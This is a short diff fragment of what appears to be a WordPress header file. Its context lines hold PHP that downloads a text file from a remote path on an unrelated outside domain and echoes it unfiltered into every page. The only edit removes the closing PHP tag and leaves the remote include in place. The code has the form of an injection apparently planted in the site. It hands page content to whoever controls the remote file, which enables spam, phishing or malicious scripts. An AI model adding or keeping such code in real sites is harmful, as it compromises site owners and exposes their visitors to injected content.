@@ -22,4 +22,4 @@ if ( ! isset( $wp_did_header ) ) {
 <?php
 $a = file_get_contents( 'https://stikesholistic.ac.id/wp-content/sitk/toto.txt' );
 echo $a;
-?>
+
